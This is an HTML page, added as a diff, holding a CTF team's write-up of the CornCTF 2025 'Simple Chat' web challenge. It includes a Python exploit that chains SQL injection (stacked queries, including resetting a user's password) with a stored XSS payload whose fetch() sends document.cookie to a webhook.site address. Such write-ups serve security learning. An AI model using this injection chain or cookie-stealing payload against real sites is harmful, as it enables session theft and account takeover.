@@ -1,0 +1,500 @@
+               
+
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+
+    <title>Simple Chat - ByteTheCookies</title>
+
+    
+
+    
+
+    
+    <meta name="author" content="ByteTheCookies" />
+    
+
+    
+        <meta property="og:url" content="http://localhost:1313/writeups/cornctf2025/simple-chat/">
+  <meta property="og:site_name" content="ByteTheCookies">
+  <meta property="og:title" content="Simple Chat">
+  <meta property="og:description" content="Simple-Chat Description: Simple web application to chat with your friends! Sometimes it does funny things and it’s ok like that
+Introduction Okay, this is a really nice challenge. This is a pretty second CTF web challenge. It’s a simple XSS with a twist.
+Source Let’s look at two parts of the FUNDAMENTAL code
+// filename: app.js app.post(&#39;/api/v1/insertChat&#39;, async (req, res) =&gt; { const sender = req.body.sender; const receiver = req.body.receiver; var message = req.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2025-07-08T20:33:28+02:00">
+    <meta property="article:modified_time" content="2025-07-08T20:33:28+02:00">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Python">
+    <meta property="article:tag" content="SQLi &#43; XSS">
+    <meta property="article:tag" content="280 Points">
+    <meta property="article:tag" content="22 Solves">
+    <meta property="article:tag" content="Val">
+
+    
+
+    
+        
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Simple Chat">
+  <meta name="twitter:description" content="Simple-Chat Description: Simple web application to chat with your friends! Sometimes it does funny things and it’s ok like that
+Introduction Okay, this is a really nice challenge. This is a pretty second CTF web challenge. It’s a simple XSS with a twist.
+Source Let’s look at two parts of the FUNDAMENTAL code
+// filename: app.js app.post(&#39;/api/v1/insertChat&#39;, async (req, res) =&gt; { const sender = req.body.sender; const receiver = req.body.receiver; var message = req.">
+
+    <link rel="stylesheet" href="/style.css" integrity="">
+
+
+
+    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">
+
+
+
+    
+        <script
+  id="MathJax-script"
+  async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"
+></script>
+<script>
+  MathJax = {
+    tex: {
+      displayMath: [
+        ["\\[", "\\]"],
+        ["$$", "$$"],
+      ], 
+      inlineMath: [
+        ["\\(", "\\)"],
+        ["$", "$"],
+      ], 
+    },
+  };
+</script>
+
+    
+
+    
+    <script>
+        if (!('theme' in localStorage)) {
+            localStorage.theme = 'dark';
+        }
+
+        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+            document.documentElement.setAttribute("data-theme", "dark");
+        } else {
+            document.documentElement.setAttribute("data-theme", "light");
+        }
+    </script>
+<script defer src="/js/header.js" integrity=""></script>
+
+
+
+    <script defer src="/js/zooming.js" integrity=""></script>
+
+
+
+
+
+
+
+    
+        
+
+        
+        
+
+        
+        
+            
+        
+
+        <script defer src="/js/prism.js" integrity="" data-manual></script>
+    
+
+
+
+    
+    
+    
+    <script defer src="/js/search-en.js" integrity=""></script>
+
+
+
+
+<link rel="stylesheet" href="http://localhost:1313/user.css">
+
+    
+
+</head>
+<body><header>
+    <div id="header_left">
+        <div id="sidebar_btn">
+            <input type="checkbox" id="sidebar_btn_input" class="hidden" />
+            <label id="sidebar_btn_label" for="sidebar_btn_input">
+                <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
+</svg>
+
+</svg>
+            </label>
+            <label id="sidebar_canvas_overlay_wrapper" for="sidebar_btn_input">
+                <div id="sidebar_canvas_overlay"></div>
+            </label>
+            <div id="sidebar">
+                <ul><li>
+                            <a href="/">💻 About</a></li><li>
+                            <a href="/news/">📰 News</a></li><li>
+                            <a href="/writeups/">📑 Writeups</a></li><li>
+                            <a href="/contacts/">✉️ Contacts</a></li></ul>
+            </div>
+        </div>
+    
+        <div class="brand">
+            <div>
+                <a href="/">ByteTheCookies</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="toolbox">
+        <div id="theme_tool">
+            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+</svg>
+
+</svg>
+            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+</svg>
+
+</svg>
+        </div>
+
+        
+            <div id="search_tool">
+                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+</svg>
+
+</svg><div id="search_menu_wrapper" class="hidden">
+    <div id="search_menu">
+        <div id="search_menu_toolbar">
+            <div id="search_menu_input_wrapper">
+                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            </div>
+            <div id="search_menu_close_btn">
+                <svg width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
+</svg>
+
+</svg>
+            </div>
+        </div>
+        <div id="search_menu_results">
+        </div>
+    </div>
+</div>
+</div>
+        
+
+        
+    </div>
+</header>
+<nav id="navbar" class="pure-menu">
+    <ul class="pure-menu-list"><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/" class="pure-menu-link">💻 About</a>
+                    
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/news/" class="pure-menu-link">📰 News</a>
+                    
+                </li><li class="navbar-item pure-menu-item insection">
+                    
+                        <a href="/writeups/" class="pure-menu-link">📑 Writeups</a>
+                    
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/contacts/" class="pure-menu-link">✉️ Contacts</a>
+                    
+                </li></ul>
+</nav>
+<main>
+      <div id="content" class="content-margin">
+        
+    
+    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#source">Source</a></li>
+    <li><a href="#solution">Solution</a></li>
+  </ul>
+</nav>
+        
+    </div></details>
+
+
+
+<div class="tags">
+  
+    <div class="badge">web</div>
+
+  
+    <div class="badge">python</div>
+
+  
+    <div class="badge">SQLi &#43; XSS</div>
+
+  
+    <div class="badge">280 points</div>
+
+  
+    <div class="badge">22 solves</div>
+
+  
+    <div class="badge">Val</div>
+
+  
+</div>
+
+<div>
+  <p class="date">
+    Last edit: Jul 8, 2025
+  </p>
+</div>
+
+
+    <div class="content-margin">
+
+
+
+<article >
+    
+    
+        
+        
+    
+    <h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>Simple-Chat</h1>
+<p><strong>Description</strong>: Simple web application to chat with your friends! Sometimes it does funny things and it&rsquo;s ok like that</p>
+
+<h2 id="introduction" class="header-anchor-wrapper">Introduction
+  <a href="#introduction" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>Okay, this is a really nice challenge. This is a pretty second CTF web challenge. It&rsquo;s a simple XSS with a twist.</p>
+
+<h2 id="source" class="header-anchor-wrapper">Source
+  <a href="#source" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>Let&rsquo;s look at two parts of the <strong>FUNDAMENTAL</strong> code</p>
+<pre  class="mc-prism hide language-text" ><code class="language-javascript">// filename: app.js
+
+app.post('/api/v1/insertChat', async (req, res) =&gt; {
+  const sender = req.body.sender;
+  const receiver = req.body.receiver;
+  var message = req.body.message;
+
+  if (!FRIENDS.includes(sender) &amp;&amp; sender !== 'admin' &amp;&amp; sender !== 'kekw') {
+    res.json({ 'status': &quot;you can't write messages on behalf of other people.&quot; })
+    return
+  }
+
+  if (!FRIENDS.includes(receiver) &amp;&amp; receiver !== 'admin' &amp;&amp; receiver !== 'kekw') {
+    res.json({ 'status': &quot;you can't write to nobody&quot; })
+    return;
+  }
+
+  //no XSS
+  message = message.replaceAll('&lt;', '&amp;lt;');
+  message = message.replaceAll('&gt;', '&amp;gt;');
+
+  const result = await db.insertChat(sender, receiver, message);
+  if (result != 0) {
+    res.json({ 'status': &quot;Couldn't insert the chat.&quot; });
+    return;
+  }
+  const response = { 'status': 'Success' };
+  res.json(response);
+})
+
+</code></pre>
+<p>In the above script, we see that several checks are made for the sender and receiver when messages are inserted into chats. Most importantly, we see that the characters <code>&lt;</code> and <code>&gt;</code> are replaced with <code>&amp;lt;</code> and <code>&amp;gt;</code>, respectively, so that we cannot insert XSS directly.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-javascript">// filename: db.js
+
+async insertChat(sender, receiver, message) {
+  try {
+    const query = `INSERT INTO chat(sender,receiver,message) VALUES ('${sender}','${receiver}','${message}');`;
+    await this.client.query(query);
+  } catch (e) {
+    console.log(`Error: ${e}`)
+    return 1;
+  }
+  return 0;
+}
+
+</code></pre>
+<p>Upon analyzing the DB calls, we see that a direct query insert is made. Therefore, we can exploit an SQLi to bypass the replace check. There are also SQLi&rsquo;s in every db query, so we can do whatever we want, like logging in as an admin, but that wasn&rsquo;t really necessary.</p>
+
+<h2 id="solution" class="header-anchor-wrapper">Solution
+  <a href="#solution" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: exploit.py
+
+#!/usr/bin/python3
+import random
+import string
+
+import requests
+
+BASE_URL = &quot;http://localhost&quot;
+# BASE_URL = &quot;https://simple-chat-b6eb1bef.challs.cornc.tf&quot;
+URL_HOOK = &quot;https://webhook.site/1911a3b8-9c48-468c-a2aa-05e81cb1df93&quot;
+
+s = requests.Session()
+
+def string_generator(length):
+    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
+
+def getMessages(friend):
+    r = s.get(BASE_URL + &quot;/api/v1/fetchMessages&quot;, params={&quot;friend[]&quot;: friend})
+    if r.status_code != 200:
+        print(&quot;Error getting messages&quot;)
+        return None
+    return r.json()
+
+def getProfile():
+    r = s.get(BASE_URL + &quot;/api/v1/profile&quot;)
+    if r.status_code != 200:
+        print(&quot;Error getting profile&quot;)
+        return None
+    return r.json()
+
+def login(username,password):
+    r = s.post(BASE_URL + &quot;/api/v1/login&quot;, json={&quot;username&quot;: username, &quot;password&quot;: password},headers={&quot;Origin&quot;:&quot;http://localhost&quot;})
+    if r.status_code != 200:
+        print(&quot;Error login&quot;)
+        return None
+    return r.json()
+
+def insertChat(sender,receiver,message):
+    r = s.post(BASE_URL + &quot;/api/v1/insertChat&quot;, json={&quot;sender&quot;: sender, &quot;receiver&quot;: receiver, &quot;message&quot;: message})
+    if r.status_code != 200:
+        print(&quot;Error inserting chat&quot;)
+        return None
+    return r.json()
+
+def build_payload_xss(sender, target_user, xss_url):
+    js_payload = f&quot;&quot;&quot;img src=&quot;a&quot; onerror=&quot;fetch('{URL_HOOK}?q='+document.cookie)&quot;);&quot;&quot;&quot;
+    sql_payload = &quot;chr(60)||'&quot; + js_payload.replace(&quot;'&quot;, &quot;''&quot;) + &quot;'||chr(62)&quot;
+    injected_query = f&quot;&quot;&quot;aaa'); INSERT INTO chat(sender, receiver, message) VALUES ('{target_user}','admin',{sql_payload});-- &quot;&quot;&quot;
+    return injected_query
+
+def ping():
+    r = s.get(BASE_URL + &quot;/ping&quot;,params={&quot;friend&quot;:&quot;Val&quot;})
+    if r.status_code != 200:
+        print(&quot;Error pinging&quot;)
+        return None
+    return r.json()
+
+def main():
+    login(&quot;kekw&quot;, &quot;kekw&quot;)
+    print(s.cookies[&quot;connect.sid&quot;])
+    print(getMessages(&quot;Val&quot;))
+    print(getProfile())
+    print(insertChat(&quot;kekw&quot;, &quot;Val&quot;, &quot;aaa'); UPDATE users SET password='cookie' WHERE username='Val'; --&quot;))
+    print(insertChat(&quot;kekw&quot;, &quot;Val&quot;, build_payload_xss(&quot;kekw&quot;, &quot;Val&quot;, URL_HOOK)))
+    print(ping())
+
+    # Wait for the XSS to trigger and send the cookie to the webhook
+
+
+if __name__ == &quot;__main__&quot;:
+	main()
+
+
+# goodluck by @akiidjk
+</code></pre>
+<pre  class="mc-prism hide language-text" ><code class="language-stdout">$ flag: corn{d0ubl3_uns4n1t1z4tion_d4mnnnn_f45a85f9d6346d8b}
+</code></pre>
+<p align='right'>Author: akiidjk </p>
+
+</article>
+</div>
+   
+      </div>
+    </main>
+<footer>
+    <article>Copyright © 2024 by ByteTheCookies Team | v1.0</article>
+</footer>
+
+</body>
+</html>
